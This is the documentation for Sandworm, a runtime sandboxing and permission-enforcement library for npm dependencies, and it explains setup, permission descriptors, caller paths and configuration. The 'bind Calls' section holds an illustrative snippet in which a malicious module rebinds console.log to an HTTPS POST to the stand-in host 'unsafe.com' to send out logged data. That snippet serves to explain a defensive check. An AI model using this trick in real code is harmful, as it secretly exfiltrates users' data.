---
description: Easy auditing & sandboxing for your JavaScript dependencies 🪱
---

# Sandworm

[![NPM][npm-version-image]][npm-version-url]
[![License][license-image]][license-url]
[![CircleCI][ci-image]][ci-url]
[![Maintainability][cc-image]][cc-url]
[![Test Coverage][coverage-image]][coverage-url]

### TL;DR

* Sandworm intercepts all potentially harmful Node & browser APIs, like arbitrary code execution (`child_process.exec`) or network calls (`fetch`). It knows what packages are responsible for each call.
* Simple obfuscation techniques can confuse static analysis tools, but Sandworm's dynamic analysis will always intercept risky calls at run time.
* You can use Sandworm to:
  * audit your dependencies, monitor activity and permissions, and see what your code is doing under the hood using the Inspector;
  * generate a security profile automatically from your test suite and do snapshot testing against it;
  * secure your app against supply chain attacks by enforcing per-module permissions.
* Install it as an `npm` module in your existing Node or browser app.
* Works in Node v15+ and [modern browsers](https://browsersl.ist/#q=defaults). Beta support for browsers and sourcemaps.

#### Get involved

* Have a support question? [Post it here](https://github.com/sandworm-hq/sandworm-js/discussions/categories/q-a).
* Have a feature request? [Post it here](https://github.com/sandworm-hq/sandworm-js/discussions/categories/ideas).
* Did you find a security issue? [See SECURITY.md](contributing/security.md).
* Did you find a bug? [Post an issue](https://github.com/sandworm-hq/sandworm-js/issues/new/choose).
* Want to write some code? See [CONTRIBUTING.md](contributing/).

#### Repos

* [The JavaScript Core](https://github.com/sandworm-hq/sandworm-js)
* [Mocha Tests Plugin](https://github.com/sandworm-hq/sandworm-mocha)
* [Jest Tests Plugin](https://github.com/sandworm-hq/sandworm-jest)

## ToC

* [Overview](index.md#overview)
* [Getting Started](index.md#getting-started)
* [Enforcing Permissions in Production Mode](index.md#enforcing-permissions-in-production-mode)
* [Supported Methods](LIBRARY.md)
* [Describing Permissions](index.md#describing-permissions)
  * [Explicit Permissions for Arbitrary Code Execution](index.md#explicit-permissions-for-arbitrary-code-execution)
  * [Node Cascading Calls](index.md#node-cascading-calls)
  * [`bind` Calls](index.md#bind-calls)
* [Caller Module Paths](index.md#caller-module-paths)
  * [Matching caller paths with RegEx](index.md#matching-caller-paths-with-regex)
  * [Trusted Modules](index.md#trusted-modules)
  * [Third Party Scripts](index.md#third-party-scripts)
  * [Browser Extensions](index.md#browser-extensions)
* [Configuration Options](index.md#configuration-options)
* [Using With Bundlers & SourceMaps](index.md#using-with-bundlers--sourcemaps)
  * [Configuring Sourcemaps](index.md#configuring-sourcemaps)
  * [Multiple Source Files](index.md#multiple-source-files)
* [How Sandworm is Tested](index.md#how-sandworm-is-tested)
* [The Permission Database Project](index.md#the-permission-database-project)
* [Contributing](contributing/)

## Overview

Sandworm.JS is a sandboxing & malware detection tool for npm packages. Rather than relying on CVE advisories, Sandworm watches lower-level APIs like the Node VM and browser APIs like DOM manipulation, fetch, etc., and throws when a package unexpectedly accesses these APIs. While this won't protect against all classes of vulnerabilities, it assures that your project is safe from hand-crafted, zero-day vulnerabilities that leave your data open to attack until a CVE is issued and a fix is published.

Most tools in this space currently use static analysis to scan a package's source and infer potential threats by looking at code patterns, invoked methods, or loaded modules. However, it's generally simple to trick such analysis tools using [various obfuscation techniques](https://swag.cispa.saarland/papers/moog2021statically.pdf). Static analysis is, therefore, not a definitive security solution and should be used in tandem with dynamic tools like Sandworm.

Sandworm does dynamic analysis in the runtime - it knows about what happens when it happens:

* It can't let you know about possible vulnerabilities before it sees the code run;
* It also can't capture information about "dormant" code that doesn't get executed;
* No obfuscation or workaround can fool our interceptors, though: as soon as any code segment attempts to invoke a sensitive method, Sandworm will capture that call and be able to allow or deny access.

## Getting Started

Add the following lines to **the very start of your app's entry point** to load Sandworm in dev mode. In dev mode, all calls will be intercepted and tracked to the inspector tool, but no enforcement will happen (all calls will be allowed).

```javascript
require('sandworm').init({devMode: true});
```

> **Warning**
> The code above needs to be the first thing your app runs when it boots so that Sandworm can adequately set up API interception and enforcement can begin if needed. If you load other modules or execute other code before this, you're no longer safe, as others will have had the opportunity to bypass Sandworm's process at that point.

> **Note**
> You can only call `init` once per your app's lifecycle.

> **Note**
> Only your app's code (at the `root` module level) will be allowed to call `init`.

Next, start the inspector tool by running:

```bash
yarn sandworm # or npm run sandworm
```

The inspector interface is now available in your browser at http://localhost:7071/. It will update in real-time with details about module activity and used permissions as your app executes. The UI also allows you to generate the JSON permissions array you need to provide to support enforcing access when moving to production.

If your automated test process has good coverage, this is an excellent time to run it, have it walk through all code paths and functionality in your app, and collect all activity within the inspector.

![Sandworm Inspector](../cli/screenshot.png)

In the left, you'll see a list of all caller paths that have been intercepted. The Permissions tab displays an aggregated list of all required permissions, while the Activity tab hosts a list of all intercepted calls. For each method call, you can see the associated arguments as well as a stack trace that can help you figure out exactly who called what.

## Enforcing Permissions

To use in production mode and start enforcing module API access restrictions, provide a `permissions` array to `Sandworm.init`:

```javascript
const Sandworm = require('sandworm');
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [{module: 'react-use', permissions: ['Storage.getItem', 'Storage.setItem']}],
});
```

* Update the `devMode` config to reflect your environment by using env vars or any other available signal;
* Provide an array of permission descriptors in the form of objects with a `module` name and a `permissions` array of strings corresponding to the allowed methods.
* The inspector can generate a baseline permissions array for you based on the activity captured in dev mode.

If an unauthorized execution attempt is detected, Sandworm will throw a `SandwormError`. Besides the `message` attribute, this error object also includes more details about the event:
* `module`: the invoking module name or path
* `method`: the invoked method (e.g. `fs.readFile`)

Note that errors might be swallowed by 3rd party code and not reach root level, so catching a `SandwormError`, while recommended, will not always work. To make sure your app code gets notified about every unauthorized execution, use the `onAccessDenied` configuration option to register a callback method that will always be triggered right before Sandworm throws, and passed the `SandwormError` object as an argument.

```javascript
const Sandworm = require('sandworm');
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [...],
    onAccessDenied: (error) => {
      trackOrLogError(error.module, error.method);
    },
});
```

## Supported Methods

See [LIBRARY.md](LIBRARY.md).

## Describing Permissions

The `permissions` config option should be an array of permission descriptor objects with the following structure:

* a `module` property that can be either a string (matching a caller path exactly) or a RegExp (not recommended - see "Matching caller paths with RegEx" below).
* a `permissions` property that can either be a boolean value (representing access to the entire library of supported methods) or an array of granular string permissions, representing individual supported methods (like `Storage.setItem` or `Fetch.fetch`).

> **Note**
> If the `permissions` passed to Sandworm do not contain an explicit descriptor for the `root` module (your app code), it will be given all permissions by default (by appending `{module: 'root', permissions: true}` to the passed list). You can override this behavior and grant only specific, explicit permissions for the root module, just like for any other modules in your app, by passing a descriptor with `module: 'root'`.

> **Note**
> In dev mode, all modules are granted all permissions, and any passed `permissions` config is ignored.

### Explicit Permissions for Arbitrary Code Execution

> **Note**
> This mainly applies to setting up permissions for the root module. For most use cases, you should avoid granting global permissions to a module call path to comply with [PoLP](https://en.wikipedia.org/wiki/Principle\_of\_least\_privilege). The default root permission descriptor is `{ module: 'root', permissions: true }`.

Setting `permissions: true` within a module descriptor will give that module (or call path) permissions to invoke any Sandworm-supported method **except** for a set of particularly unsafe ones that allow for arbitrary code execution - like `eval` or `vm.runInContext`. Using these methods carries a considerable security risk and should generally be avoided. Rigorously audit the code of a module that uses these before using it in your app.

However, suppose you do choose to give your app's code (or any specific caller) access to all underlying APIs **as well as** arbitrary code execution methods. In that case, you need to explicitly change your `permissions` from `true` to `['eval.eval', '*']` to acknowledge that you accept this high-risk configuration.

### Node Cascading Calls

Some Node APIs internally call other APIs as part of their operation. For example:

* when loading local files, `require` uses several `fs` methods as well as `vm.compileFunction`;
* `https.require` uses `dns.lookup` and `tls.Socket`.

To support this, Sandworm will automatically allow the execution of any method calls where the direct caller is part of Node's internal sources. This would indicate that:

* another Node API has been previously invoked, resulting in the current cascading call;
* either the previous call has been captured and allowed by Sandworm;
* or it was not part of Sandworm's library, and thus deemed safe for free use.

### `bind` Calls

For all intercepted methods, Sandworm will also capture and enforce access to `method.bind` **whenever it is called with more than one argument**. The reason behind this is that using `bind` to partially apply arguments creates contained methods that can then float around until they get executed by another module. For example:

```javascript
// Say we're a module that doesn't have `https.request` access
// but we want to post some stolen data to our server.
// We can create a custom method with the proper arguments using `bind`
// and then we can use it to replace a common js function.
// Sandworm will require the `bind.args` permission to allow this.
console.log = https.request.bind(this, {
  hostname: 'unsafe.com',
  port: 443,
  path: '/ingest',
  method: 'POST'
});

// Now we just wait for root to log anything
```

## Caller Module Paths

Sandworm-detected module names reflect the entire code path that led to invoking a method, from your app's level down to the actual module executing the method.

Let's say your app imports a module named `test-libB`, which depends on a method from a separate module, `test-libA`, which in turn ends up using `axios` to make an HTTP request. Internally, `axios` uses the `follow-redirects` module as a drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. In this case, you should expect to see the following module name requesting to use the `https.request` permission:

```
test-libB>test-libA>axios>follow-redirects
```

Sandworm uses this path structure to create a proper security model. For example, let's say we want to grant permissions to the call described above:

* Since it initiated the call chain, we could directly grant access to the `test-libB` module. But this would enable **any of `test-libB`'s dependencies** to piggyback on this permission to execute malicious calls.
* We could also directly grant access to `follow-redirects`, but then we are effectively enabling any module in our app to use it for making any requests, including potentially malicious ones.
* The safest option is to grant explicit permissions to explicit module paths, like the one above:

```javascript
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [{module: 'test-libB>test-libA>axios>follow-redirects', permissions: ['https.request', 'tls.connect', 'tls.createSecureContext', 'net.Socket', 'dns.lookup']}],
});
```

### Matching caller paths with RegEx

In some scenarios, it is helpful to be able to grant permissions in bulk - like when executing inside a test runner. While this is not generally recommended and may lead to vulnerabilities outside of a controlled environment, the permission descriptor `module` property also accepts a `RegExp` to match multiple module names. Here's a real-world example taken from our automated tests using Jest:

```javascript
Sandworm.init({
    devMode: false,
    skipTracking: true,
    permissions: [
      // Jest runner needs vm.runInContext and bind.args, we explicitly allow them below
      {module: /jest/, permissions: ['vm', 'bind', '*']},
      {module: 'root', permissions: false},
      {module: 'source-map-support', permissions: ['fs']},
    ],
  });
```

### Trusted Modules

Sometimes, you might want to exclude specific module names from the caller path, as they are part of the trusted platform you're using to run your app. For example, when running React, the `react-dom` module usually sits at the bottom of the module hierarchy and is responsible for triggering most method calls. To specify trusted modules, use the `trustedModules` configuration option.

> **Note**
> When specifying a trusted module, you effectively permit it to impersonate root. Use this configuration carefully.

### Third Party Scripts

Sandworm interprets scripts loaded via the `<script>` tag as individual modules. This is why, for example, you might see `https://googletagmanager.com` invoking `Beacon.sendBeacon` whenever your app sends analytics data. To modify this behavior:

* add the script to the `trustedModules` config array, or
* if the script is part of the app and built with a bundler, provide the path to a source map via the `loadSourceMaps` config option.

### Browser Extensions

Sandworm can also catch activity coming from local, user-installed browser extensions. To enable this, set the `ignoreExtensions` config option to `false`. By default (`ignoreExtensions: true`), any invoke that has a browser extension anywhere in the call path will be passed through.

### Aliases

Root code can be segmented into multiple "virtual" modules based on the file path by defining aliases. This can be useful, for example, when running tests, to separate core code from testing infrastructure code:

```javascript
// Say we want to run unit tests for https://github.com/expressjs/express
require("sandworm").init({
  devMode: true,
  trustedModules: ['mocha'],
  // This will make the express core source code register as `express` instead of `root`
  // Unit test code will still be labeled `root`
  aliases: [{path: 'express/lib', name: 'express'}],
});
```

To configure aliases, set the `aliases` config option to an array of objects having:
* a string `path` attribute, representing a path component shared between all source code files that should be matched by the alias;
* a string `name` attribute, representing the alias name to apply.

## Configuration Options

| Option | Default | Description |
| --- | --- | --- |
| `loadSourceMaps` | `true` in browsers `false` in Node | Set this to true to automatically load the sourcemap declared in the caller js file. Alternatively, to load multiple sources and sourcemaps, set this to an object with source file paths/URLs as keys and sourcemap file paths/URLs as values. |
| `devMode` | `false` | In dev mode, all calls are captured, allowed, and tracked to the inspector. When dev mode is false, Sandworm will enforce user-provided permissions and will not track calls. |
| `verbose` | `false` | The default logger level is `warn`; setting this to `true` lowers the level to `debug`. |
| `skipTracking` | `false` | Set this to true to stop event tracking to the inspector in dev mode. |
| `trackingIP` | `127.0.0.1` | The IP address for the inspector. |
| `trackingPort` | `7071` | The port number for the inspector. |
| `ignoreExtensions` | `true` | Ignore activity from browser extensions. |
| `trustedModules` | `[]` | Utility or platform modules that Sandworm should remove from a caller path. |
| `permissions` | `[]` | Module permissions to enforce if dev mode is false. |
| `onAccessDenied` | `undefined` | A function that will be invoked right before throwing on access denied. The error itself will be passed as the first arg. |
| `aliases` | `[]` | An array of alias definitions - see [aliases](#aliases). |

## Using With Bundlers & SourceMaps

Sandworm relies on source file paths to determine caller modules for each method invocation. Unfortunately, when bundling your code with Webpack, Parcel, Rollup, or other similar tools, that information is lost, as everything gets bundled together in a single file. To re-enable Sandworm in this scenario, you'll also need to provide a [sourcemap](https://developer.chrome.com/blog/sourcemaps/).

> **Note**
> When loading sourcemaps, `Sandworm.init` becomes an async method you need to `await`. It is best to wait for it to finish before importing other modules or further initializing your app. Until then, Sandworm will not be able to correctly infer module names, potentially leading to legitimate calls being blocked.

The simplest way to instruct Sandworm to load sourcemaps is to pass `loadSourceMaps=true` to `Sandworm.init`. Setting this option to `true` will load the sourcemap defined within the currently executing js file (containing the `init`-invoking code).

> **Note**
> `loadSourceMaps` is true by default when running Sandworm in a browser.

```javascript
await Sandworm.init({ loadSourceMaps: true });
```

### Configuring Sourcemaps

Ideally, your generated sourcemap:

* should be inlined with the source file itself to save an extra network request;
* should exclude the sources, as you probably don't what those to be publicly available, and they will unnecessarily inflate the file size;
* should only include line numbers to reduce the file size, as we're only ever interested in original file names.

### Multiple Source Files

If you're generating multiple source files in your bundling process, you'll need to let Sandworm know. Otherwise, js files distinct from the main file (the one that has initially called `init`) will be treated as entirely individual modules. To signal you need multiple code files, pass an object to the `loadSourceMaps` option with source paths (or URLs) as keys and sourcemap paths (or URLs) as values:

```javascript
await Sandworm.init({
  loadSourceMaps: {
          'http://localhost:3001/static/js/main.chunk.js':
            'http://localhost:3001/static/js/main.chunk.js.map',
          'http://localhost:3001/static/js/vendors~main.chunk.js':
            'http://localhost:3001/static/js/vendors~main.chunk.js.map',
        },
});
```

## The Permission Database Project

A longer-term goal for Sandworm is to provide an open, public database of per-package permission requirements, based on:
* running automated tests with Sandworm enabled for public packages;
* anonymous info about requirements collected from real-world apps by the inspector.

For every method call that Sandworm intercepts, the inspector will share the following info:

```json
{
  "module": "CALLER_MODULE_NAME",
  "family": "INVOKED_METHOD_FAMILY",
  "method": "INVOKED_METHOD_NAME",
  "sessionId": "INSPECTOR_SESSION_ID"
}
```

This will make it easier for everyone to audit packages and set up Sandworm. To opt out of sharing data with the community, run the inspector with the `--no-telemetry` option. You can also audit [what's getting sent](https://github.com/sandworm-hq/sandworm-js/blob/main/cli/index.js#L19) and the [server code](https://github.com/sandworm-hq/sandworm-collect).

## How Sandworm is Tested

Sandworm has several layers of automated testing:

* Jest is used to run Node.js capture & enforce tests for all supported Node APIs (tests run on Node 16.10 and above). See the `tests/node` directory.
* Playwright is used to run browser capture & enforce tests for all supported browser APIs (tests run on WebKit, Chromium, and Firefox). See the `tests/web` directory.
* Jest is used to run unit tests on the core Sandworm source files. See the `tests/unit` directory.

Check out our latest test run inside our [CircleCI pipeline](https://app.circleci.com/pipelines/github/sandworm-hq/sandworm-js).

[npm-version-image]: https://img.shields.io/npm/v/sandworm?style=flat-square
[npm-version-url]: https://www.npmjs.com/package/sandworm
[license-image]: https://img.shields.io/npm/l/sandworm?style=flat-square
[license-url]: https://github.com/sandworm-hq/sandworm-js/blob/main/LICENSE
[ci-image]: https://img.shields.io/circleci/build/github/sandworm-hq/sandworm-js?style=flat-square
[ci-url]: https://app.circleci.com/pipelines/github/sandworm-hq/sandworm-js
[cc-image]: https://api.codeclimate.com/v1/badges/edff60f7f06bb0c589aa/maintainability
[cc-url]: https://codeclimate.com/github/sandworm-hq/sandworm-js/maintainability
[coverage-image]: https://api.codeclimate.com/v1/badges/edff60f7f06bb0c589aa/test_coverage
[coverage-url]: https://codeclimate.com/github/sandworm-hq/sandworm-js/test_coverage
